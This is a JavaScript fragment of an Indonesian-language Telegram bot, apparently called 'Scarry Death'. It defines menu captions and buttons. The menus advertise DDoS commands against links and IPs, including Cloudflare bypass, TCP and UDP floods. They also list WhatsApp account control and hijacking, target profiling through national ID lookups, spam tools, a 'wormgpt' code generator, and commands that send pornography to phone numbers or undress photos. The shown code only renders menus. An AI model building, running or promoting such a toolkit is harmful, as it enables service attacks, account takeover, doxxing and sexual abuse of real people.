 ${raraa}‬ /kirimpesan - sender target/idgc
 ${raraa} /addstory - mengupload story wa
 ${raraa} /cekwa 628xx - mengambil foto profil + bio whatsapp target
</blockquote>
`;
    newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "cpanel") {
    newCaption = `        
<blockquote>
「 ᴄᴘᴀɴᴇʟ × ᴍᴇɴᴜ 」
${raraa} /setpanel  
➜ Menambahkan PLTA & PLTC secara otomatis (tanpa setting manual)
${raraa} /listpanel  
➜ Menampilkan semua daftar panel (PLTA & PLTC) yang tersimpan
${raraa} /delpanel  
➜ Menghapus panel dari daftar (berdasarkan nomor)
${raraa} /1gb - nama  
➜ Membuat server (tersedia 1GB - UNLI)
${raraa} /listserver  
➜ Menampilkan semua server yang tersimpan
${raraa} /delserver  
➜ Menghapus server user (pilih via button)
${raraa} /cadp - nama  
➜ Membuat admin panel otomatis
${raraa} /addadmin id  
➜ Menambahkan akses admin panel ke user
${raraa} /addprem id days  
➜ Memberikan akses premium user (1GB - UNLI)
${raraa} /addgroup days  
➜ Memberikan akses premium semua member group sekaligus
</blockquote>
`;
    newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "ddos") {
    newCaption = `        
<blockquote>
「 ᴅᴅᴏꜱ × ᴍᴇɴᴜ 」
 ${raraa} /ddos https link time
 ${raraa} /ddos flood link time
 ${raraa} /ddos tls link time
 ${raraa} /ddos glory link time
 ${raraa} /ddos kill link time
 ${raraa} /ddos cibi link time
 ${raraa} /ddos thunder link time
 ${raraa} /ddos bypass link time
 ${raraa} /ddos cloudflare link time
 ${raraa} /ddos blast link time
 ${raraa} /ddos tcp ip vps
 ${raraa} /ddos udp ip website
</blockquote>
`;
    newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "ctrlbot") {
    newCaption = `
<blockquote>
「 ᴄᴏɴᴛʀᴏʟ × ʙᴏᴛ ᴍᴇɴᴜ 」
 ‪‪${raraa}‬ /login - login nama token target
 ${raraa} /listlogin - listlogin nama
 ${raraa} /notifikasi - notifikasi nama on
 ${raraa} /nama - nama pesan id target
 ${raraa} /logout - nama
</blockquote>
`;
    newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "groupmenu") {
    newCaption = `        
<blockquote>
「 ɢʀᴏᴜᴘ × ᴍᴇɴᴜ 」
${raraa} /setwelcome - text welcome  
${raraa} /welcome - welcome on / off  
${raraa} /antilink - anlink on / off  
${raraa} /antitag - antitag usr on / off  
${raraa} /antikata - off / on  
${raraa} /addkata textnya - add kata terlarang  
${raraa} /delkata textnya - delete kata terlarang  
${raraa} /listkata - menampilkan list kata terlarang  
${raraa} /antipesan on / off - delete pesan member  
${raraa} /promote name - promote user to admin  
${raraa} /demote - delete admin  
${raraa} /kick - replay / tag username  
${raraa} /mute - membisukan pengguna  
${raraa} /unmute - unmute a user  
${raraa} /warn - replay username  
${raraa} /ban - tag username / replay  
${raraa} /unband - tag username / replay  
${raraa} /getlink - getlink group  
${raraa} /getpp - replay user  
</blockquote>
`;
    newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "cvps") {
    newCaption = `
<blockquote>
「 ᴄᴠᴘꜱ × ᴍᴇɴᴜ 」
${raraa} /cvps hostname - click to button ram  
${raraa} /listdroplet - menampilkan list all droplet  
${raraa} /sisadroplet - menampilkan sisa droplet  
${raraa} /deldroplet - id vps digital ocean  
${raraa} /rebuild - id vps digital ocean  
${raraa} /restartvps - id digital ocean  
${raraa} /installpanel - ipvps|pwvps|domainpanel|domainnode|ramserver  
${raraa} /installwings - IpVps|PwVps|domainpanel|domainnode  
${raraa} /swings - ipvps|pwvps|token_node  
${raraa} /setpwvps - ipvps|password_lama|password_baru  
${raraa} /uninstallwings - ipvps|pwvps  
${raraa} /uninstallpanel - ipvps|pwvps  
${raraa} /hbpanel - ipvps,pwvps  
${raraa} /uninstalltema - ipvps|pwvps  
${raraa} /installtemanebula - ipvps|pwvps  
${raraa} /installtemaelysium - ipvps|pwvps  
${raraa} /installtemanook - ipvps|pwvps  
</blockquote>
`;
    newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "asupan") {
    newCaption = `
<blockquote>
「 ᴀꜱᴜᴘᴀɴ × ᴍᴇɴᴜ 」
 ${raraa} /bokepsendwa 628xxx jumlah - send bokep ke wa
 ${raraa} /autosendbokep jumlah - send bokep random sesuai jumlah
 ${raraa} /sendbokep - get random video 18+
 ‪‪${raraa} /hentai - get image asupan random anime
 ${raraa} /animehentai - get image asupan random anime
 ${raraa} /cosplay - get image random cosplay
 ${raraa} /indonesia - get random image cecan indo
 ${raraa} /japan - get random image cecan japan
 ${raraa} /korea - get random image cecan korea
 ${raraa} /china - get random image cecan china
 ${raraa} /vietnam - get random image vietnam
 ${raraa} /thailand - get random image thailand
 ${raraa} /loli - get random image
 ${raraa} /bluearchive - get random image
 ${raraa} /waifu - get random image waifu
</blockquote>
`;
    newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "search") {
    newCaption = `
<blockquote>
「 ᴛᴏᴏʟꜱ v4 × ᴍᴇɴᴜ 」
 ‪‪${raraa} /apkmod name apk - mencari apk mod
 ${raraa} /playstore name apk - mencari apk di playstore
 ${raraa} /createemail name - create email sementara bisa nerima kode
 ${raraa} /tojapanese - mengubah postoer bersama cewe jepang
 ${raraa} /soundmeme - menampilkan list button sound meme lucu
 ${raraa} /nulis - replay pesan bot sesuai intruksi dari bot
 ${raraa} /doa kata kunci - cocok buat luu tobat
 ${raraa} /kisahnabi - masukin nama nabi nya
 ${raraa} /asmaulhusna - get random asmaul husna lengkap
 ${raraa} /quranaudio angka - menampilkan membaca surah lengkap
 ${raraa} /surahrandom - get random surat alquran
 ${raraa} /jadwalsholat - lokasi tempatnya buat menampilkan jadwalnya
</blockquote>
`;
 newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "tools5") {
    newCaption = `
<blockquote>
「 ᴛᴏᴏʟꜱ v5 × ᴍᴇﾆ 」
${raraa} /ampreset - get info preset alight motion
 ${raraa} /ytplay - search music yt & send mp3
 ${raraa} /spotify - search music spotify
 ${raraa} /tempmailcreate - create email sementara 
 ${raraa} /inbox - cek code tempmail yang masuk
 ${raraa} /komikindo - get random komik indo
 ${raraa} /18+ - get random image 18+
 ${raraa} /bokep - get random image bokep
 ${raraa} /kiss - get random image bokep
 ${raraa} /maid - get random image maid
 ${raraa} /animek - get random image animek
 ${raraa} /uniform - get random image uniform
 ${raraa} /selfies - get random image selfies
 ${raraa} /oppai - get random image oppai
 ${raraa} /football - get informasi berita tentang sepak bola
 ${raraa} /freefire id - get informasi username profil
 ${raraa} /ml idgame idzone - get informasi username profil
</blockquote>
`;    
    newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "protection") {
    newCaption = `
<blockquote>
「 ᴘʀᴏᴛᴇᴄᴛɪᴏɴ × ᴍᴇﾆ 」
 ${raraa} /installprotectall - ipvps|pwvps (install anti rusuh server)
 ${raraa} /uninstallprotectall - ipvps|pwvps (delete anti rusuh server)
 ‪‪${raraa} /connectpanel - domain plta pltc
 ${raraa} /listpanelprotect - melihat keamanan
 ${raraa} /delpanelprotect - delete connect server
menjaga keamanan panel pterodacly & juga vps menghindari dari yang run sc ddos otomatis terdeteksi & di delete langsung bair server panel & vps aman
</blockquote>
`;
    newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "toolsv2") {
    newCaption = `
<blockquote>
「 ᴛᴏᴏʟꜱ v2 × ᴍᴇﾆ 」
 ${raraa} /ustadz - text
 ${raraa} /fakestory - rply foto name | text
 ${raraa} /emojimox - emoji1 emoji2
 ${raraa} /fakecall - nama,durasi
 ${raraa} /sertifikat nama - create foto sertifikat
 ${raraa} /ssweb link - screnshoot website
 ${raraa} /ai - on / off menjawab pertanyaan
 ${raraa} /deploy namaweb - deploy html vercel
 ${raraa} /artinama - namaluu
 ${raraa} /prompt - text luu otomatis create image
 ${raraa} /cat - get random image kucing
 ${raraa} /berita - get informasi berita new
 ${raraa} /gempa - get informasi bmkg new
 ${raraa} /jadwaltv - channelnya masukin
 ${raraa} /searchtt - send nama videonya
 ${raraa} /xnxx textnya - send pencarian lu
 ${raraa} /muslimai - pertanyaan tentang islam
 ${raraa} /emojitogif - send emojinya
 ${raraa} /neko - get random image neko
 ${raraa} /cuaca - search perkiraan cuaca
</blockquote>
`;
    newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "toolsv3") {
    newCaption = `
<blockquote>
「 ᴛᴏᴏʟꜱ v3 × ᴍᴇﾆ 」
 ${raraa} /animequote - get episode anime quote
 ${raraa} /bimg - search image
 ‪‪${raraa} /veo3 - text prompt to video
 ${raraa} /papayang - get random image pap
 ${raraa} /bucin - get random text bucin
 ${raraa} /pantun - get random text pantun
 ${raraa} /meme - get random image meme lucu
 ${raraa} /fotbersamav1 - menggabungkan foto dengan artis
 ${raraa} /tobersamav2 - menggabungkan 2 foto jadi 1
 ${raraa} /tofigura - merubah foto menjadi 1/7
 ${raraa} /tohijab - menambahkan hijab di muka
 ${raraa} /tobotak - menghilangkan rambut
 ${raraa} /tohitam - merubah warna kulit menjadi hitam
 ${raraa} /toemotebatu - fotbar bersama emote batu
 ${raraa} /tomekah - merubah foto  menjadi di mekah
${raraa} /akuntt - username tiktok
</blockquote>
`;
   newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "tools6") {
    newCaption = `
<blockquote>
「 ᴛᴏᴏʟꜱ v6 × ᴍᴇﾆ 」
 ${raraa} /brat text - brat text to imgae
 ‪‪${raraa} /gura - replay foto dan ketik command /gura
 ${raraa} /nsfwcheck - replay ke foto untuk checek image nsfw / porn iya atau tidak
 ${raraa} /nanobanana - replay foto dan ketik promptnya sesuaikan imajinasimu
 ${raraa} /nik - track informasi nik ktp
 ${raraa} /getproxy - get ip proxy all negara free
 ${raraa} /cekresi - cek id pesanan online untuk mendapatkan informasi pengiriman
</blockquote>
`;
   newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "gachaa") {
    newCaption = `
<blockquote>
「 ɢᴀᴄʜᴀ × ᴍᴇﾆ 」
 ‪‪${raraa} /setlink - @username bisa group atau ch
 ${raraa} /additem - replay file itemnya buat di add di gacha
 ${raraa} /listitem - menampilkan nomor list item
 ${raraa} /delitem - nomer item yang akan di delete
 ${raraa} /gacha - user harus join ke 
╰┈➤ @username yang kamu set sebelum menggunakan perintah ini
</blockquote>
`;
   newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "jasher") {
    newCaption = `
<blockquote>
「 ᴊᴀꜱʜᴇʀ × ᴍᴇﾆ 」
 ‪‪${raraa} /share - replay pesan yang mau di forward ke grouo
 ${raraa} /autoshare angka d/m - auto forward pesan ke grouo
 ${raraa} /stop - untuk berhenti auto forward
 ${raraa} /listgroup - menampilkan daftar group bot yang join
╰┈➤ yang autoshere itu d=detik m=menit misal 30d=30detik jedanya setiap shere otomatis
</blockquote>
`;
   newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "gabut") {
    newCaption = `        
<blockquote>
「 ɢᴀʙᴜᴛᴢ × ᴍᴇﾆ 」
 ${raraa} /tebakmasadepan 
 ${raraa} /cektolol
 ${raraa} /cekganteng
 ${raraa} /cekcantik
 ${raraa} /slot
 ${raraa} /ceksisibaik
 ${raraa} /ceksisigelap
 ${raraa} /ceknontonbokep
 ${raraa} /cekmesum
 ${raraa} /cekkontol
 ${raraa} /berantem @user @user - tag 2 orang
 ${raraa} /sukacoli
 ${raraa} /sukacabul
 ${raraa} /sukamesum
 ${raraa} /teskejujuran
 ${raraa} /startbon - untuk memulai permainin tebak bom
 ${raraa} /daftar - untuk daftar mengikuti tebak bom
 ${raraa} /mulai - untuk memulai pertandingan
 ${raraa} /pilih angka - memilih kotak
 ${raraa} /restart - untuk exit game / memulai ulang
 ${raraa} /vn text - menjadikan text ke mp3 
</blockquote>
`;
   newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "gabutv2") {
    newCaption = `
<blockquote>
「 ɢᴀʙᴜᴛᴢV2 × ᴍᴇﾆ 」
 ‪‪${raraa} /tebakpikiranku
 ${raraa} /sifatmasakecilku
 ${raraa} /cekmati
 ${raraa} /cekkhodam
 ${raraa} /ulartangga
 ${raraa} /petualangan
 ${raraa} /tebakpikiranku
 ${raraa} /tebakemoji
 ${raraa} /tebaktebakan
 ${raraa} /tekateki
 ${raraa} /asahotak
</blockquote>
`;
   newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "tools7") {
    newCaption = `        
<blockquote>
「 ᴛᴏᴏʟꜱ ᴠ7 × ᴍᴇɴᴜ 」
 ${raraa} /tonaked - mengubah foto menjadi tidak berpakaian
 ${raraa} /igdl link - download video instagram
 ${raraa} /qc - replay pesan untuk di jadikan sticker
 ${raraa} /ceknamabapak - replay pesan user untuk cek nama bapaknya
 ${raraa} /terjemahan on/off - terjemahkan bahasa secara otomatis
 ${raraa} /superhd - send foto untuk di jadikan HD
 ${raraa} /toreal - send foto untuk di jadikan realistik
 ${raraa} /tomonyet - send foto untuk di jadikan muka monyet
 ${raraa} /tobabi - send foto untuk di jadikan muka babi
 ${raraa} /todpr - send foto untuk di jadikan DPR
 ${raraa} /toanime - send foto untuk di jadikan versi anime
 ${raraa} /topiramida - send foto untuk di jadikan di piramida
 ${raraa} /topolaroid - send foto untuk di jadikan polaroid
 ${raraa} /ceklink id - buat ambil link mengguanakan id group / ch cocok buat basmi grub yg culik botmu
 ${raraa} /cekjoingroup - cek bot yang dia join semua group dan bisa mengetahui username pembuat group
 ${raraa} /outallgroup - bot akan otomatis keluar dari semua group yang dia join kecuali group yang menggunakan perintah itu
</blockquote>
`;
   newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "ulartangga") {
    newCaption = `
<blockquote>
「 ᴜʟᴀʀᴛᴀɴɢɢᴀ × ᴍᴇﾆ 」
 ‪‪${raraa} /ulartangga - untuk menampilkan all menu
 ${raraa} /createroom - untuk membuat room ular tangga buat mabar
 ${raraa} /join - untuk bergabung ke room max 10 pemain
 ${raraa} /letsgo - untuk memulai permainan ular tangga
 ${raraa} /dadu - untuk mengocok dadu pas giliranmu
 ${raraa} /exit - untuk menghapus room ular tangga yang di buat 
</blockquote>
`;
   newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "boom") {
    newCaption = `
<blockquote>
「 ʙᴏᴏᴍ × ᴍᴇﾆ 」
 ‪‪${raraa} /startbom - untuk membuat room tebak boom
 ${raraa} /daftar - untuk join ke room tebak boom untuk bisa mabar max 10 pemain
 ${raraa} /mulai - untuk memulai permainan tebak bom 
 ${raraa} /pilih angka - saat giliranmu kamu di suruh pilih angka yang mau kamu buka hindari dari boom biar nga kalah / di keluarin dari room
 ${raraa} /resetbom - untuk menghapus room yang di buat
</blockquote>
`;
   newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "suit") {
    newCaption = `
<blockquote>
「 ꜱᴜɪᴛ × ᴍᴇﾆ 」
 ‪‪${raraa} /suitroom - untuk create room suit dan 1grub itu team akan melawan grub 2 wajib genap 4 8 13 grub
 ${raraa} /suitjoin - untuk join ke dalam room
 ${raraa} /suitstart - untuk memulai permainan suit
 ${raraa} /suitexit - untuk menghapus room yang telah di buat dan memberhentikan permainnan
</blockquote>
`;
   newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "tools8") {
    newCaption = `
<blockquote>
「 ᴛᴏᴏʟꜱ ᴠ8 × ᴍᴇɴᴜ 」
 ${raraa} /wormgpt - bisa membuatkan mu code sesukamu yang lu mau dll
 ${raraa} /removebg - menghapus latar belakang pada foto
 ${raraa} /reactch link post - reaction channel dengan emoji sebanyak 1rb++
 ${raraa} /cekwa 628xx - cek informasi foto profil wa & bio
 ${raraa} /cici - berbicara dengan cici ai
 ${raraa} /alldownload link - download semua video support all sosmed
${raraa} /cekagama - replay ke pesan user sambil ketik perintah itu
</blockquote>
`;
   newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];
  } else if (data === "tools") {
    newCaption = `
<blockquote>
「 ᴛᴏᴏʟꜱ × ᴍᴇﾆ 」
 ${raraa} /fixcode - replay file / text
 ${raraa} /cekerror - replay file / text
 ${raraa} /sbrat - replay text untuk di jadikan sticker brat
 ${raraa} /cekid 
 ${raraa} /hardenc - Encrypt File Anti Crack
 ${raraa} /cvid - teks to vidio
 ${raraa} /cekwa - nomor
 ${raraa} /aiXvideo
 ${raraa} /tourl - media
 ${raraa} /play - lagu
 ${raraa} /done - teks
 ${raraa} /enchard - reply file .js
 ${raraa} /getcode - link
 ${raraa} /nglspam
 ${raraa} /tiktok - url
 ${raraa} /cekip
 ${raraa} /hytamkan - reply photo
 ${raraa} /cekkhodam - random
 ${raraa} /cekpacar - random
 ${raraa} /cekcantik - random
 ${raraa} /cektampan - random
 ${raraa} /cekkaya - random
 ${raraa} /cekjanda - random
 ${raraa} /iqc - stiker iphone 
 ${raraa} /cekmiskin - random
</blockquote>
`;
    newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

} else if (data === "mainmenu" || data === "scarry_bug_home") {
  newParseMode = "HTML";
  newCaption = `
<blockquote>
${e1}<b>𝗦𝗖𝗔𝗥𝗥𝗬 𝗗𝗘𝗔𝗧𝗛 ── 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗘𝗗𝗜𝗧𝗜𝗢𝗡</b> ${e2}

"The shadows speak, and we listen." ${e3}
"Silent strikes, eternal echoes." ${e4}
"Scarry Death — New Version." ${e5}

${e6}Selamat datang di otoritas Scarry Death.
Bergerak dalam keheningan, menguasai tanpa jejak,
serta mendominasi dengan presisi mutlak.${e7}

${e8} Tetap waspada, tetap tak terlihat.
Pembalasan terbaik adalah eksekusi tanpa suara.${e9}

${e10}<b>𝗖𝗢𝗥𝗘 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗦𝗬𝗦𝗧𝗘𝗠</b>${e11}
${e12}System Name  : Scarry Death
${e13}Version      : 42.0 Pro
${e14}Developer    : @callmymell
${e15}Mode         : ${mode}
${e16}Date         : ${new Date().toLocaleDateString()}
${e17}Today        : ${date || "-"}
${e18} 𝗦𝗖𝗔𝗥𝗥𝗬 𝗗𝗘𝗔𝗧𝗛 ${e19} 𝙎𝙩𝙚𝙖𝙡𝙩𝙝 𝙈𝙤𝙙𝙚${e20} 𝘼𝙘𝙩𝙞𝙫𝙖𝙩𝙚𝙙${e21}
</blockquote>
`.trim();

  newButtons = [
    [
      {
        text: "✦ 𝗕𝗨𝗚𝗦 𝗠𝗘𝗡𝗨 ✦",

      callback_data: "onlymurbug",

      style: "success",

      icon_custom_emoji_id: EMOJI.puzzle

    }

  ],

  [

    {

      text: "◁",

      callback_data: "toolsnew4",

      style: "primary",

      icon_custom_emoji_id: EMOJI.grin

    },

    {

      text: "⌂ 𝗛𝗢𝗠𝗘",

      callback_data: "mainmenu",

      style: "danger",

      icon_custom_emoji_id: EMOJI.alien

    },

    {

      text: "▷",

      callback_data: "settings",

      style: "primary",

      icon_custom_emoji_id: EMOJI.starBtn

    }

  ],

  [

    {

      text: "⚙️ 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦 𝗠𝗘𝗡𝗨",

      callback_data: "settings",

      style: "success",

      icon_custom_emoji_id: EMOJI.candy

    }

  ],

  // ⟦ ELITE ⟧ (SUCCESS)

  [

    { text: "⌬ 𝗧𝗢𝗢𝗟𝗦 ⟡ 𝗘𝗟𝗜𝗧𝗘", callback_data: "tools", style: "success", icon_custom_emoji_id: EMOJI.topStar },

    { text: "◈ 𝗠𝗢𝗡𝗜𝗧𝗢𝗥 ⟡ 𝗘𝗟𝗜𝗧𝗘", callback_data: "sadap", style: "success", icon_custom_emoji_id: EMOJI.glow },

    { text: "❖ 𝗦𝗘𝗦𝗦𝗜𝗢𝗡 ⟡ 𝗘𝗟𝗜𝗧𝗘", callback_data: "session", style: "success", icon_custom_emoji_id: EMOJI.cap }

  ],

  // ⟦ TOOLS VERSI ⟧ (PRIMARY)

  [

    { text: "⟐ 𝗧𝗢𝗢𝗟𝗦 ┃ 𝗩𝗘𝗥 Ⅱ", callback_data: "toolsv2", style: "primary", icon_custom_emoji_id: EMOJI.keyboard },

    { text: "⟐ 𝗧𝗢𝗢𝗟𝗦 ┃ 𝗩𝗘𝗥 Ⅲ", callback_data: "toolsv3", style: "primary", icon_custom_emoji_id: EMOJI.alphabet },

    { text: "⌕ 𝗦𝗘𝗔𝗥𝗖𝗛 ┃ 𝗩𝗘𝗥 Ⅳ", callback_data: "search", style: "primary", icon_custom_emoji_id: EMOJI.glow }

  ],

  [

    { text: "⛨ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 ┃ 𝗩𝗣𝗦", callback_data: "protection", style: "primary", icon_custom_emoji_id: EMOJI.shield || EMOJI.devil },

    { text: "⟐ 𝗧𝗢𝗢𝗟𝗦 ┃ 𝗩𝗘𝗥 Ⅴ", callback_data: "tools5", style: "primary", icon_custom_emoji_id: EMOJI.mushroom },

    { text: "⟐ 𝗧𝗢𝗢𝗟𝗦 ┃ 𝗩𝗘𝗥 Ⅵ", callback_data: "tools6", style: "primary", icon_custom_emoji_id: EMOJI.ghost }

  ],

  [

    { text: "⟐ 𝗧𝗢𝗢𝗟𝗦 ┃ 𝗩𝗘𝗥 Ⅶ", callback_data: "tools7", style: "primary", icon_custom_emoji_id: EMOJI.blackCat },

    { text: "⟐ 𝗧𝗢𝗢𝗟𝗦 ┃ 𝗩𝗘𝗥 Ⅷ", callback_data: "tools8", style: "primary", icon_custom_emoji_id: EMOJI.moon },

    { text: "⟡ 𝗚𝗔𝗖𝗛𝗔 ┃ 𝗠𝗘𝗡𝗨", callback_data: "gachaa", style: "primary", icon_custom_emoji_id: EMOJI.giftTop }

  ],

  // ⟦ FUN ⟧ (DANGER)

  [

    { text: "⌁ 𝗚𝗔𝗕𝗨𝗧 ┃ 𝗠𝗘𝗡𝗨", callback_data: "gabut", style: "danger", icon_custom_emoji_id: EMOJI.laugh },

    { text: "⌁ 𝗚𝗔𝗕𝗨𝗧 ┃ 𝗠𝗘𝗡𝗨 Ⅱ", callback_data: "gabutv2", style: "danger", icon_custom_emoji_id: EMOJI.candle1 },

    { text: "⟡ 𝗝𝗔𝗦𝗛𝗘𝗥 ┃ 𝗠𝗘𝗡𝗨", callback_data: "jasher", style: "danger", icon_custom_emoji_id: EMOJI.devil }

  ],

  [

    { text: "⟐ 𝗨𝗟𝗔𝗥 𝗧𝗔𝗡𝗚𝗚𝗔", callback_data: "ulartangga", style: "danger", icon_custom_emoji_id: EMOJI.snake || EMOJI.ghost },

    { text: "⬣ 𝗕𝗢𝗢𝗠 ┃ 𝗠𝗘𝗡𝗨", callback_data: "boom", style: "danger", icon_custom_emoji_id: EMOJI.skullBottom },

    { text: "✦ 𝗦𝗨𝗜𝗧 ┃ 𝗠𝗘𝗡𝗨", callback_data: "suit", style: "danger", icon_custom_emoji_id: EMOJI.knife }

  ],

  // ⟦ PANEL ⟧ (SUCCESS)

  [

    { text: "⟐ 𝗖𝗩𝗣𝗦 ┃ 𝗣𝗔𝗡𝗘𝗟", callback_data: "cvps", style: "success", icon_custom_emoji_id: EMOJI.topMedal },

    { text: "⟐ 𝗖𝗣𝗔𝗡𝗘𝗟 ┃ 𝗣𝗔𝗡𝗘𝗟", callback_data: "cpanel", style: "success", icon_custom_emoji_id: EMOJI.cap },

    { text: "⌕ 𝗗𝗗𝗢𝗦 ┃ 𝗠𝗘𝗡𝗨", callback_data: "ddos", style: "success", icon_custom_emoji_id: EMOJI.ghost }

  ],

  // ⟦ CONTROL ⟧ (PRIMARY)

  [

    { text: "⌬ 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 ┃ 𝗕𝗢𝗧", callback_data: "ctrlbot", style: "primary", icon_custom_emoji_id: EMOJI.keyboard },

    { text: "⌁ 𝗔𝗦𝗨𝗣𝗔𝗡 ┃ 𝗠𝗘𝗡𝗨", callback_data: "asupan", style: "primary", icon_custom_emoji_id: EMOJI.rice },

    { text: "⟡ 𝗚𝗥𝗢𝗨𝗣 ┃ 𝗠𝗘𝗡𝗨", callback_data: "groupmenu", style: "primary", icon_custom_emoji_id: EMOJI.thumbs1 }

  ],

  [

    {

      text: "✚ 𝗔𝗗𝗗 𝗧𝗢 𝗚𝗥𝗢𝗨𝗣",

      url: "https://t.me/botscarrydeathh_bot?startgroup=true",

      style: "success",

      icon_custom_emoji_id: EMOJI.giftBottom

    }

  ],

  // ⟦ FOOTER ⟧

  [

    {

      text: "⌁ 𝗢𝗪𝗡𝗘𝗥",

      url: "https://t.me/ellysvinderellequen",

      style: "primary",

      icon_custom_emoji_id: EMOJI.thumbs2

    },

